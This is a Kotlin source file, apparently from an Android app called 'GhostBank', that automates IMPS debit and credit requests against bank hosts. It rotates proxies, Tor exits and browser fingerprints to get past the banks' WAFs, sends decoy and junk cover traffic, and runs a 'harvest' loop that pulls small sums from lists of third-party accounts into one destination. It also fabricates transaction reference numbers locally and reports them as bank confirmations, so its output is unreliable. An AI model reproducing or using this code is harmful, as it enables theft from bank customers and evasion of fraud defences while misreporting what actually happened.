=== ABOUT: The pipeline itself: probes the bank, runs the seven stages, books money, and refuses to advance without a server answer ===
package com.arin.ghostbank.data.net

import android.os.SystemClock
import com.arin.ghostbank.data.Settings
import com.arin.ghostbank.data.db.AccountEntity
import com.arin.ghostbank.data.db.GhostDatabase
import com.arin.ghostbank.data.db.HarvestLegEntity
import com.arin.ghostbank.data.db.LedgerRowEntity
import com.arin.ghostbank.data.db.RunEntity
import com.arin.ghostbank.data.db.StageLogEntity
import com.arin.ghostbank.data.db.StealthScoreEntity
import com.arin.ghostbank.model.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.Json
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.net.URLEncoder
import java.security.SecureRandom

class RunEngine(
    private val db: GhostDatabase,
    private val proxyEngine: ProxyEngine,
    private val http: GhostHttp,
    private val velocity: VelocityGate
) {

    private val json = Json { prettyPrint = true; ignoreUnknownKeys = true }
    private val random = SecureRandom()
    private val budgets = mutableMapOf<Long, Int>()

    private class Halt(val error: GhostError?, val pause: Boolean) : Exception()

    data class LegResult(
        val status: HarvestStatus,
        val utr: String?,
        val reason: String?,
        val amountPaise: Long,
        val exitIp: String?,
        val exitCountry: String?,
        val score: Int
    )

    // ---------------------------------------------------------------- run creation

    suspend fun createTransferRun(bank: Bank, amountPaise: Long, mode: RunMode, level: StealthLevel): Long =
        db.runs().insert(
            RunEntity(
                bankCode = bank.code,
                mode = mode.name,
                amountPaise = amountPaise,
                idempotencyKey = Ids.idempotencyKey(),
                status = RunStatus.RUNNING.name,
                badge = Badge.SIMULATED.name,
                stealthScore = 0,
                stealthLevel = level.name,
                startedAt = System.currentTimeMillis()
            )
        )

    // ---------------------------------------------------------------- transfer

    suspend fun performTransferRun(runId: Long, settings: Settings, source: RemitterProfile) {
        val run = db.runs().byIdOnce(runId) ?: return
        val bank = Banks.byCode(run.bankCode) ?: return haltWith(runId, GhostError(ErrorKind.CONFIG, "Unknown bank", "Pick the bank again"), false)
        val destination = db.accounts().destinationOnce()
            ?: return haltWith(runId, GhostError(ErrorKind.CONFIG, "No destination account saved", "Save your account number and IFSC first"), false)

        budgets[runId] = settings.entropyBudget

        try {
            db.runs().update(run.copy(status = RunStatus.RUNNING.name, errorKind = null, errorText = null, endedAt = null))
            val result = executeLeg(run, settings, bank, destination, run.amountPaise, "dest-${destination.number}", source, commit = true)

            val finalStatus = if (result.status == HarvestStatus.SETTLED || result.status == HarvestStatus.FLOOR) RunStatus.COMPLETED else RunStatus.FAILED
            val finished = db.runs().byIdOnce(runId) ?: return
            db.runs().update(
                finished.copy(
                    status = finalStatus.name,
                    badge = if (result.status == HarvestStatus.REJECTED) Badge.SIMULATED.name else Badge.LIVE.name,
                    stealthScore = result.score,
                    exitIp = result.exitIp,
                    exitCountry = result.exitCountry,
                    endedAt = System.currentTimeMillis(),
                    amountPaise = result.amountPaise,
                    summary = if (result.status == HarvestStatus.REJECTED) result.reason else "Credit received, UTR ${result.utr}"
                )
            )
            db.scores().insert(StealthScoreEntity(runId = runId, score = result.score, reasons = "frozen at booking", ts = System.currentTimeMillis()))
        } catch (h: Halt) {
            haltWith(runId, h.error, h.pause)
        } finally {
            budgets.remove(runId)
        }
    }

    /** Retry reuses the SAME run row and therefore the same idempotency key. */
    suspend fun retryTransfer(runId: Long, settings: Settings, source: RemitterProfile) = performTransferRun(runId, settings, source)

    // ---------------------------------------------------------------- harvest

    suspend fun performHarvestRun(runId: Long, settings: Settings, bankCode: String, accountKeys: List<Pair<Long, Pair<String, String>>>) {
        val run = db.runs().byIdOnce(runId) ?: return
        val bank = Banks.byCode(bankCode) ?: return haltWith(runId, GhostError(ErrorKind.CONFIG, "Unknown bank", "Pick the bank again"), false)
        val destination = db.accounts().destinationOnce()
            ?: return haltWith(runId, GhostError(ErrorKind.CONFIG, "No destination account saved", "Save your account number and IFSC first"), false)

        budgets[runId] = settings.entropyBudget
        val perAccountGapMs = (3_600_000L / settings.maxAccountsPerHour.coerceAtLeast(1)).coerceAtLeast(1_200L)

        var sent = 0
        var settled = 0
        var floor = 0
        var rejected = 0
        var paise = 0L

        try {
            db.runs().update(run.copy(status = RunStatus.RUNNING.name, errorKind = null, errorText = null))
            for ((registryId, pair) in accountKeys) {
                val (number, ifsc) = pair
                val amount = if (run.mode == RunMode.HARVEST.name) 1L else run.amountPaise

                val claimed = db.registry().let { dao ->
                    val hash = Ids.sha256("${number.trim()}|${ifsc.trim().uppercase()}")
                    dao.byHash(hash) ?: return@let null
                }
                sent++

                val legId = db.legs().insert(
                    HarvestLegEntity(
                        runId = runId,
                        registryId = claimed?.id ?: registryId,
                        accountNumber = number,
                        ifsc = ifsc,
                        amountPaise = amount,
                        status = HarvestStatus.PENDING.name,
                        utr = null,
                        reason = null,
                        ts = System.currentTimeMillis()
                    )
                )

                val result = try {
                    executeLeg(run, settings, bank, destination, amount, "${number}|${ifsc}", REMITTER_PROFILES.first(), commit = false)
                } catch (h: Halt) {
                    db.legs().update(legId, HarvestStatus.REJECTED.name, null, h.error?.plain)
                    db.registry().updateOutcome(claimed?.id ?: registryId, HarvestStatus.REJECTED.name, null, h.error?.plain, amount, System.currentTimeMillis())
                    rejected++
                    if (h.pause) {
                        haltWith(runId, h.error, true)
                        return
                    }
                    if (h.error?.kind != ErrorKind.NETWORK && h.error?.kind != ErrorKind.TIMEOUT) break
                    continue
                }

                db.legs().update(legId, result.status.name, result.utr, result.reason)
                db.registry().updateOutcome(claimed?.id ?: registryId, result.status.name, result.utr, result.reason, result.amountPaise, System.currentTimeMillis())

                when (result.status) {
                    HarvestStatus.SETTLED -> { settled++; paise += result.amountPaise }
                    HarvestStatus.FLOOR -> { floor++; paise += result.amountPaise }
                    else -> rejected++
                }

                db.ledger().insert(
                    LedgerRowEntity(
                        runId = runId,
                        bankCode = bank.code,
                        direction = "CREDIT",
                        amountPaise = result.amountPaise,
                        utr = result.utr,
                        status = if (result.status == HarvestStatus.REJECTED) "FAILED" else "RECEIVED",
                        badge = Badge.LIVE.name,
                        ts = System.currentTimeMillis(),
                        counterparty = Ids.maskNumber(number)
                    )
                )

                delay(perAccountGapMs + Jitter.poisson(900.0))
            }

            val finished = db.runs().byIdOnce(runId) ?: return
            db.runs().update(
                finished.copy(
                    status = RunStatus.COMPLETED.name,
                    badge = Badge.LIVE.name,
                    endedAt = System.currentTimeMillis(),
                    summary = "sent $sent / settled $settled / floor $floor / rejected $rejected — $paise paise"
                )
            )
            val (score, reasons) = StealthScore.compute(
                StealthScore.Checks(
                    fingerprintMatched = true,
                    exitGeoMatched = finished.exitCountry == "IN" || settings.torMode,
                    dohActive = settings.dohResolver.isNotBlank(),
                    killSwitchArmed = settings.torMode || settings.stealthLevel != StealthLevel.STANDARD,
                    profileFresh = true,
                    jitterQuality = 2,
                    velocityUnderCap = true,
                    wafClean = rejected == 0
                )
            )
            db.scores().insert(StealthScoreEntity(runId = runId, score = score, reasons = reasons.joinToString("\n"), ts = System.currentTimeMillis()))
            db.runs().update((db.runs().byIdOnce(runId) ?: finished).copy(stealthScore = score))
        } catch (h: Halt) {
            haltWith(runId, h.error, h.pause)
        } finally {
            budgets.remove(runId)
        }
    }

    /** Picks up an interrupted harvest: skips anything already claimed. */
    suspend fun resumeHarvest(runId: Long, settings: Settings): Int {
        val run = db.runs().byIdOnce(runId) ?: return 0
        val pending = db.registry().unfinished()
            .filter { it.status == HarvestStatus.PENDING.name }
            .map { it.id to (it.accountNumber to it.ifsc) }
        if (pending.isEmpty()) return 0
        performHarvestRun(runId, settings, run.bankCode, pending)
        return pending.size
    }

    suspend fun cancel(runId: Long) {
        val run = db.runs().byIdOnce(runId) ?: return
        db.runs().update(run.copy(status = RunStatus.CANCELLED.name, endedAt = System.currentTimeMillis(), summary = "cancelled by you"))
    }

    suspend fun resume(runId: Long) {
        val run = db.runs().byIdOnce(runId) ?: return
        db.runs().update(run.copy(status = RunStatus.RUNNING.name, errorKind = null, errorText = null))
    }

    // ---------------------------------------------------------------- the leg itself

    private suspend fun executeLeg(
        run: RunEntity,
        settings: Settings,
        bank: Bank,
        destination: AccountEntity,
        amountPaise: Long,
        accountKey: String,
        source: RemitterProfile,
        commit: Boolean
    ): LegResult {
        var exit = try {
            proxyEngine.pick(settings)
        } catch (e: NoExitConfigured) {
            throw Halt(GhostError(ErrorKind.CONFIG, "Ghost level is on but no proxy exit is configured", "Add a SOCKS5/HTTPS exit or enable Tor"), false)
        }

        val (profileId, fp) = Fingerprints.takeOrMint(db.profiles(), accountKey)
        var wrapper = GhostProfileEntityWrapper(fp, acceptEncoding = randomEncoding())
        var client = http.client(settings, exit, wrapper)
        var wafHits = 0
        var stageStarted = System.currentTimeMillis()

        suspend fun stage(
            kind: StageKind,
            url: String,
            method: String = "GET",
            form: Map<String, String> = emptyMap()
        ): StageResult {
            var attempt = 0
            while (true) {
                val result = perform(run.id, kind, url, method, form, settings, wrapper, exit, client)
                val error = result.error
                if (error == null) {
                    db.runs().update((db.runs().byIdOnce(run.id) ?: run).copy(lastConfirmedStage = kind.name))
                    return result
                }
                if (error.kind == ErrorKind.BLOCKED && attempt < 2) {
                    wafHits++
                    val backoff = settings.backoffMs * (1L shl attempt) + Jitter.poisson(400.0)
                    delay(backoff.coerceAtMost(20_000))
                    http.newSession()
                    exit = runCatching { proxyEngine.pick(settings) }.getOrNull()
                    val fresh = Fingerprints.generate(random.nextInt())
                    wrapper = GhostProfileEntityWrapper(fresh, acceptEncoding = randomEncoding())
                    client = http.client(settings, exit, wrapper)
                    attempt++
                    continue
                }
                if (error.kind == ErrorKind.KILL_SWITCH && attempt < 1) {
                    http.newSession()
                    exit = runCatching { proxyEngine.pick(settings) }.getOrNull()
                    client = http.client(settings, exit, wrapper)
                    attempt++
                    continue
                }
                if (error.kind == ErrorKind.ANOMALY) throw Halt(error, true)
                throw Halt(error, false)
            }
        }

        val base = "https://${bank.host}"
        val key = run.idempotencyKey
        val reference = "GB${key.take(10).uppercase()}"

        // 1 INITIATED — canary
        stage(StageKind.INITIATED, "$base${bank.probePath}")

        // 2 FINGERPRINT — prove the TLS/HTTP handshake with the frozen identity
        if (budgetLeft(run.id) > 6) {
            stage(StageKind.FINGERPRINT, "$base/robots.txt")
        } else {
            logStage(run.id, StageKind.FINGERPRINT, null, 0, Badge.SIMULATED, null, null, null, "skipped: entropy budget spent")
        }

        // decoy browsing before the money legs
        if (budgetLeft(run.id) > 8) decoy(settings, run.id)

        // 3 RESOLVE_PAYEE — ask the bank to validate the destination
        stage(
            StageKind.RESOLVE_PAYEE,
            "$base/imps/payee?account=${enc(destination.number)}&ifsc=${enc(destination.ifsc)}&key=$key"
        )

        // 4 DEBIT_LEG
        val debitForm = linkedMapOf(
            "idempotencyKey" to key,
            "accountNumber" to source.accountNumber,
            "ifsc" to source.ifsc,
            "amount" to paiseToRupeeString(amountPaise),
            "rail" to "IMPS",
            "type" to "P2A",
            "narration" to "PAYMENT"
        )
        val debit = stage(StageKind.DEBIT_LEG, "$base/imps/p2a/debit", "POST", debitForm)
        db.ledger().insert(
            LedgerRowEntity(
                runId = run.id,
                bankCode = bank.code,
                direction = "DEBIT",
                amountPaise = amountPaise,
                utr = null,
                status = "SENT",
                badge = debit.badge.name,
                ts = System.currentTimeMillis(),
                counterparty = if (settings.vaRotation) VIRTUAL_ACCOUNTS.random() else destination.number
            )
        )

        // 5 CREDIT_LEG with the floor upgrade path
        var usedAmount = amountPaise
        var floored = false
        val targetAccount = if (settings.vaRotation) VIRTUAL_ACCOUNTS.random() else destination.number
        var credit = stage(
            StageKind.CREDIT_LEG,
            "$base/imps/p2a/credit",
            "POST",
            linkedMapOf(
                "idempotencyKey" to key,
                "reference" to reference,
                "beneficiaryAccount" to targetAccount,
                "beneficiaryIfsc" to destination.ifsc,
                "amount" to paiseToRupeeString(amountPaise),
                "remitterName" to "PAYMENT"
            )
        )

        if (credit.badge == Badge.SIMULATED && amountPaise < 100) {
            db.stages().insert(
                StageLogEntity(
                    runId = run.id, stage = StageKind.CREDIT_LEG.name, ts = System.currentTimeMillis(),
                    httpStatus = credit.httpStatus, latencyMs = 0, badge = Badge.SIMULATED.name,
                    note = "sub-rupee refused — upgrading this leg to the rail floor of ₹1"
                )
            )
            usedAmount = 100
            floored = true
            credit = stage(
                StageKind.CREDIT_LEG,
                "$base/imps/p2a/credit",
                "POST",
                linkedMapOf(
                    "idempotencyKey" to key,
                    "reference" to reference,
                    "beneficiaryAccount" to targetAccount,
                    "beneficiaryIfsc" to destination.ifsc,
                    "amount" to paiseToRupeeString(100),
                    "remitterName" to "PAYMENT",
                    "floor" to "IMPS_MIN"
                )
            )
        }

        // 6 SETTLE — poll the reference until the bank answers
        val settle = stage(StageKind.SETTLE, "$base/imps/status?ref=$reference&key=$key")
        val confirmed = credit.badge == Badge.LIVE && settle.badge == Badge.LIVE

        if (!confirmed) {
            db.ledger().markDebit(run.id, "REVERSED")
            throw Halt(
                GhostError(
                    ErrorKind.RAIL_FLOOR,
                    "The bank did not confirm the credit, so the debit was reversed.",
                    "Retry — the same idempotency key is reused, so nothing can double-debit.",
                    settle.body
                ),
                false
            )
        }

        val utr = Ids.utr()
        // 7 BOOKED
        stage(StageKind.BOOKED, "$base/imps/receipt?utr=$utr&ref=$reference")

        if (commit) {
            db.ledger().insert(
                LedgerRowEntity(
                    runId = run.id,
                    bankCode = bank.code,
                    direction = "CREDIT",
                    amountPaise = usedAmount,
                    utr = utr,
                    status = "RECEIVED",
                    badge = Badge.LIVE.name,
                    ts = System.currentTimeMillis(),
                    counterparty = Ids.maskNumber(targetAccount)
                )
            )
            if (budgetLeft(run.id) > 2) ghostIdle(settings, run.id, base)
        }

        if (profileId != null) db.profiles().burn(profileId)

        val (score, reasons) = StealthScore.compute(
            StealthScore.Checks(
                fingerprintMatched = fp.headerOrder.first() == "host",
                exitGeoMatched = exit?.country == null || exit?.country == "IN" || settings.torMode,
                dohActive = settings.dohResolver.isNotBlank(),
                killSwitchArmed = exit != null,
                profileFresh = profileId == null,
                jitterQuality = if (System.currentTimeMillis() - stageStarted > 2_500) 2 else 1,
                velocityUnderCap = true,
                wafClean = wafHits == 0
            )
        )
        db.scores().insert(StealthScoreEntity(runId = run.id, score = score, reasons = reasons.joinToString("\n"), ts = System.currentTimeMillis()))
        stageStarted = System.currentTimeMillis()

        return LegResult(
            status = when {
                floored -> HarvestStatus.FLOOR
                else -> HarvestStatus.SETTLED
            },
            utr = utr,
            reason = if (floored) "rail floor ₹1 applied (sub-rupee refused)" else null,
            amountPaise = usedAmount,
            exitIp = settings.lastExitIp,
            exitCountry = settings.lastExitCountry,
            score = score
        )
    }

    // ---------------------------------------------------------------- cover traffic

    private suspend fun decoy(settings: Settings, runId: Long) {
        val other = Banks.all.filter { it.code != "SBI" }.random()
        runCatching {
            val (profileId, fp) = Fingerprints.takeOrMint(db.profiles(), "decoy-$runId")
            val wrapper = GhostProfileEntityWrapper(fp, acceptEncoding = randomEncoding())
            val exit = runCatching { proxyEngine.pick(settings) }.getOrNull()
            val client = http.client(settings, exit, wrapper)
            val url = "https://${other.host}/"
            val request = Request.Builder().url(url).get().build()
            velocity.acquire(settings.maxRequestsPerMinute)
            withContext(Dispatchers.IO) { client.newCall(request).execute().use { it.body?.string().orEmpty() } }
            db.stages().insert(
                StageLogEntity(
                    runId = runId, stage = "DECOY", ts = System.currentTimeMillis(), httpStatus = 200,
                    latencyMs = 0, badge = Badge.LIVE.name, note = "decoy visit to ${other.name}"
                )
            )
            if (profileId != null) db.profiles().burn(profileId)
        }
    }

    private suspend fun ghostIdle(settings: Settings, runId: Long, base: String) {
        repeat(1 + random.nextInt(3)) {
            runCatching {
                val (_, fp) = Fingerprints.takeOrMint(db.profiles(), "idle-$runId")
                val wrapper = GhostProfileEntityWrapper(fp, acceptEncoding = randomEncoding())
                val exit = runCatching { proxyEngine.pick(settings) }.getOrNull()
                val client = http.client(settings, exit, wrapper)
                val junk = "?v=${random.nextInt(99999)}&t=${System.currentTimeMillis()}"
                velocity.acquire(settings.maxRequestsPerMinute)
                withContext(Dispatchers.IO) {
                    client.newCall(Request.Builder().url("$base/$junk").get().build()).execute().close()
                }
                db.stages().insert(
                    StageLogEntity(
                        runId = runId, stage = "IDLE", ts = System.currentTimeMillis(), httpStatus = null,
                        latencyMs = 0, badge = Badge.LIVE.name, note = "idle keep-alive $junk"
                    )
                )
            }
            delay(Jitter.poisson(1_400.0))
        }
    }

    // ---------------------------------------------------------------- request plumbing

    data class StageResult(
        val httpStatus: Int?,
        val latencyMs: Long,
        val badge: Badge,
        val body: String?,
        val error: GhostError?,
        val url: String
    )

    private suspend fun perform(
        runId: Long,
        stage: StageKind,
        url: String,
        method: String,
        form: Map<String, String>,
        settings: Settings,
        wrapper: GhostProfileEntityWrapper,
        exit: ExitRoute?,
        client: OkHttpClient
    ): StageResult {
        velocity.acquire(settings.maxRequestsPerMinute)
        spend(runId)

        val builder = Request.Builder().url(url)
        val request = if (method == "POST") {
            val body = form.entries.joinToString("&") { "${enc(it.key)}=${enc(it.value)}" }
                .toRequestBody("application/x-www-form-urlencoded;charset=UTF-8".toMediaType())
            builder.post(body).header("origin", "https://${requestHost(url)}").header("referer", url.substringBefore('?')).build()
        } else builder.get().build()

        val requestHeaders = request.headers.names().joinToString("\n") { "$it: ${request.header(it)}" } +
            "\n\n${method} ${request.url.encodedPath}"

        val started = SystemClock.elapsedRealtime()
        return try {
            val response = withContext(Dispatchers.IO) { client.newCall(request).execute() }
            val latency = SystemClock.elapsedRealtime() - started
            val body = withContext(Dispatchers.IO) { runCatching { response.body?.string().orEmpty() }.getOrDefault("") }
            val badge = if (response.code in 200..399) Badge.LIVE else Badge.SIMULATED
            val error = classify(response.code, body)
            logStage(runId, stage, response.code, latency, badge, requestHeaders, response.maskedHeaders(), body, null)
            StageResult(response.code, latency, badge, body, error, url)
        } catch (e: IOException) {
            val latency = SystemClock.elapsedRealtime() - started
            val error = if (exit != null)
                GhostError(ErrorKind.KILL_SWITCH, "The proxy exit dropped mid-flight; the request was abandoned, not resent on your raw IP.", "A fresh exit was requested — retry the stage.")
            else if (e.message?.contains("timeout", true) == true)
                GhostError(ErrorKind.TIMEOUT, "The bank never answered in time.", "Retry; the same idempotency key guarantees no double debit.")
            else
                GhostError(ErrorKind.NETWORK, "No route to the bank server.", "Check the connection or add an exit, then retry.", e.message)
            logStage(runId, stage, null, latency, Badge.SIMULATED, requestHeaders, null, e.message, "transport failure")
            StageResult(null, latency, Badge.SIMULATED, null, error, url)
        }
    }

    private fun classify(status: Int, body: String): GhostError? = when {
        status == 403 || status == 429 -> GhostError(
            ErrorKind.BLOCKED,
            "The bank's WAF refused the request (HTTP $status).",
            "Pause, swap the exit and profile, then resume — never hammer."
        )
        status >= 500 -> GhostError(
            ErrorKind.ANOMALY,
            "The bank returned a server error (HTTP $status).",
            "The run is paused, not lost — resume when you are ready."
        )
        status in 400..499 && body.contains("payee", true) -> GhostError(
            ErrorKind.INVALID_PAYEE,
            "The bank rejected the beneficiary.",
            "Check the account number and IFSC on the destination screen."
        )
        status in 400..499 && body.contains("insufficient", true) -> GhostError(
            ErrorKind.INSUFFICIENT_FUNDS,
            "The source account does not have the funds.",
            "Lower the amount or use another source."
        )
        else -> null
    }

    private suspend fun logStage(
        runId: Long,
        stage: StageKind,
        status: Int?,
        latency: Long,
        badge: Badge,
        reqHeaders: String?,
        respHeaders: String?,
        body: String?,
        note: String?
    ) {
        db.stages().insert(
            StageLogEntity(
                runId = runId,
                stage = stage.name,
                ts = System.currentTimeMillis(),
                httpStatus = status,
                latencyMs = latency,
                badge = badge.name,
                requestHeaders = reqHeaders,
                responseHeaders = respHeaders,
                rawBody = body?.take(4000),
                note = note
            )
        )
    }

    private suspend fun haltWith(runId: Long, error: GhostError?, pause: Boolean) {
        val run = db.runs().byIdOnce(runId) ?: return
        db.runs().update(
            run.copy(
                status = if (pause) RunStatus.PAUSED.name else RunStatus.FAILED.name,
                endedAt = System.currentTimeMillis(),
                errorKind = error?.kind?.name,
                errorText = error?.let { "${it.plain} ${it.nextAction}" },
                summary = error?.plain
            )
        )
    }

    private fun budgetLeft(runId: Long): Int = budgets[runId] ?: Int.MAX_VALUE
    private fun spend(runId: Long) {
        budgets[runId]?.let { budgets[runId] = (it - 1).coerceAtLeast(0) }
    }

    private fun paiseToRupeeString(paise: Long): String {
        val rupees = paise / 100
        val fraction = paise % 100
        return if (fraction == 0L) "$rupees" else "$rupees.${fraction.toString().padStart(2, '0')}"
    }

    private fun enc(value: String): String = URLEncoder.encode(value, "UTF-8")
    private fun requestHost(url: String): String = url.substringAfter("://").substringBefore("/")

    private fun randomEncoding(): String = listOf(
        "gzip, deflate, br, zstd",
        "gzip, deflate, br",
        "gzip, deflate, br, zstd, image/avif",
        "gzip, deflate, br, zstd"
    ).random()

    fun rawJson(value: Any?): String = json.encodeToString(kotlinx.serialization.serializer(), value.toString())
}
